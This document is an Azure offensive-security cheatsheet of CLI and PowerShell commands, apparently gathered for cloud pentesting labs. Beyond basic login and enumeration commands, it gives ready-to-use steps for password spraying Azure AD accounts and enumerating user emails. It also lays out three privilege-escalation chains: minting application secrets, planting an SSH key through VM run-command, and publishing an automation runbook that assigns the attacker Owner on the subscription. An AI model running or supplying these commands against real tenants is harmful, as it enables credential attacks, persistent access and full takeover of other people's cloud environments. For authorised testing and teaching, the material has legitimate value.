## Azure cheatsheet
- `az` is the CLI for ARM, PowerShell commands for Azure AD
### Basic commands
- Authenticate an account
```
az login
```
- List authenticated accounts
```
az account list
```
- Show account info
```
az account show
```
- Set an account as default
```
az account set --subscription ID
```
- Remove a default account
```
az logout
```
- Authenticate an Azure AD account (PS)
```
Connect-AzureAD
```
- Switch between tenant subscriptions
```
Set-AzContext
```
- Get current Azure AD account (PS)
```
$res=Get-AzureADCurrentSessionInfo
$res
```
- Authenticate via graph for O365 and Azure AD
```
Connect-MgGraph
```
- Authenticate with a service principal via `az` (Application ID and Secret)
```
az login --service-principal -u APPID -p SECRET --tenant TENANTID
```
- Authenticate with a service principal via Azure AD (Application ID and Secret)
```
$cred = Get-Credential //Enter the APPID as User and SECRET as Password
Connect-AzAccount -ServicePrincipal -Tenant TENANTID -Credential $cred
```
- Authenticate with a service principal via Azure AD (Application ID and Certificate, certificate must exist locally)
```
Connect-AzureAD -ApplicationId APPID -TenantId TENANTID -CertificateThumbprint CERTTHUMBID
```
- Authenticate with an account ID and access token via `az`
```
az account get-access-token --resource https://management.azure.com //This is for ARM, replace with graph.microsoft.com for O356
Connect-AzAccount -AccessToken TOKEN
```
- Authenticate with an account ID and access token with Azure AD
```
Connect-AzureAD -AadAccessToken TOKEN -TenantId TENANTID
```
### General Enumeration
- Use AADInternals `https://aadinternals.com/osint/` to OSINT your target domain
- Enumerate a domain's tenant information
```
https://login.windows.net/DOMAIN/.well-known/openid-configuration
```
- Enumerate whether Azure AD is used by an organization (The `NameSpaceType` value is `Managed` if that is the case)
```
https://logic.microsoftonline.com/getuserrealm.srf?login=USEREMAIL&xml=1
```
- Enumerate a list of emails (in a file) against Azure AD
```
o365creeper.py -f FILENAME
```
- Password spray against a list of Azure AD user emails
```
Invoke-PasswordSprayEWS -ExchHostname outlook.office365.com -UserList FILENAME -Password PASSWORD
```
- Get Azure AD domains
```
Get-AzureADDomain
```
- Get a list of Azure AD directory roles
```
Get-AzureADDirectoryRole
```
- Get a list of users with a specific Azure AD directory role
```
Get-AzureADDirectoryRoleMember -ObjectId ROLEID
```
- Get a list of all users
```
Get-AzureADUser
```
- Get a list of all groups
```
Get-AzureADGroup
```
- Get a specific group's owner
```
Get-AzureADGroupOwner --ObjectId GROUPID
```
- Get a list of all applications
```
Get-AzureADApplication
```
- Get a list of all service principals
```
Get-AzureADServicePrincipal
```
- Get a specific application's owner
```
Get-AzureADApplicationOwner --ObjectId OBJECTID
```
- Get a specific application's permissions
```
$app = Get-AzureADApplication --ObjectId OBJECTID
$app.RequiredResourceAccess | ConvertTo-Json //Take note of the "ResourceAppId" and role IDs
$sp = Get-AzureADServicePrincipal -All $true | Where-Object {$_.AppId -eq RESOURCEAPPID}
$sp.AppRoles | Where-Object {$_.Id -eq ROLEID}
```
- Get a specific service principal's assigned roles
```
az role assignment list --assignee OBJECTID --all
```
> `roleDefinitionName` is the actual role, `scope` is the scope of the role
- Get a specific role's definition
```
az role definition list -n ROLENAME
```
- Get all custom role definitions
```
az role definition list --custom-role-only
```
- List resources
```
az resource list
```
- List automation accounts
```
az automation account list
```
- List resource groups
```
az group list
```
- AD enumeration subcommands
```
az ad --help
```
- Enumrate all of an SP's role assignments
```
az role assignment list --all --assignee OBJECTID --include-inherited --include-groups
```

### Enumeration with MicroBurst
- Enumerate public Azure blobs (PS)
```
Import-Module ./MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base KEYWORD -verbose
```
> Use Microsoft Azure Storage Explorer to view a blob's contents

### Azure VM enumeration
- List VMs
```
az vm list
```
- List a specific VM's IP addresses
```
az vm list-ip-addresses --resource-group VMGROUP --name VMNAME
```
- In a shell on a VM, run the following to install `az` in case it isn't installed
```
curl -sL https://aka.ms/installazurecliDeb | sudo bash
```
- In a shell on a VM, run this to authenticate if an identity already exists
```
az login --identity
```

### Privilege escalation via application owner access
- If you have `RoleManagement.ReadWrite.Directory` on an application as an owner then you can escalate to global admin
```
New-AzureADApplicationPasswordCredential -ObjectId OBJECTID
```
- Authenticate with the application ID and secret returned in the output

### Privilege escalation via run command permissions on a VM
- If you can run commands on a VM then you can run any commands (Change `RunShellScript` if the machine is Windows)
```
az vm run-command invoke --resource-group VMGROUP -n VMNAME --command-id RunShellScript --scripts "SHELLCOMMAND"
```
- Gain SSH access to the machine
```
ssh-keygen
az vm run-command invoke --resource-group VMGROUP -n VMNAME --command-id RunShellScript --scripts "echo 'ssh-rsa SSHPUBKEY' >> /home/USERNAME/.ssh/authorized_keys"
ssh -i IDENTITY USERNAME@VMIPADDRESS
```
> Run `az network nsg list` to check the security group rules in case SSHing into the VM doesn't work

### Privilege escalation via automation accounts
- If you have contributor access to a resource group then you can escalate your privileges depending on the resources in the group
- List the resources and check their resource groups
```
az resource list
```
- If your resource group has `automationAccounts` access with a contributor role, then you can create runbooks with arbitrary code
- List the existing automation accounts and check if your resource group has any of them
```
az automation account list
```
- Also check the identity that the automation account runs under (hopefully Owner)
```
az role assignment list --assignee OBJECTID --all
```
- List the runbooks under the automation account
```
az automation runbook list --automation-account-name AANAME --resource-group RGNAME
```
- Prepare the following PS script for privilege escalation
```powershell
try{
    "Loggin into Azure..."
    Connect-AzAccount -Identity
}catch{
    Write-Error -Message $_.Exception
    throw $_.Exception
}
New-AzRoleAssignment -ObjectId OBJECTID -RoleDefinitionName Owner -Scope "/subscriptions/SUBSCRIPTIONID"
```
- Create the runbook and execute the PS script
```
az automation runbook create --automation-account-name AANAME --resource-group RGNAME --name RUNBOOKNAME --type "PowerShell" --location "East US"
az automation runbook replace-content --automation-account-name AANAME --resource-group RGNAME --name RUNBOOKNAME --content @./PATH/TO/PSSCRIPT.ps1
az automation runbook publish --automation-account-name AANAME --resource-group RGNAME --name RUNBOOKNAME
az automation runbook show --automation-account-name AANAME --resource-group RGNAME --name RUNBOOKNAME //Confirm runbook was created
```
- Confirm the role was assigned to your object
```
az role assignment list --assignee OBJECTID --all
```

## Tools and resources
- https://github.com/mgeeky/AzureRT/tree/master
- [Microsoft Graph CLI reference](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.authentication/connect-mggraph?view=graph-powershell-1.0)
- https://github.com/SlyJose/Hacking-Notes/blob/8b70388e4af7d8ed9b745639d33c1a6d9aa1f990/Hacking-Vault/MCRTA%20-%20Azure%20Lab%20Resolution.md
